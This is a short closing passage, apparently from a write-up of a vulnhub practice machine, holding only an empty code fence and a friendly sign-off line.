```


Finally, it was a nice `vulnhub` machine and I hope you like it.


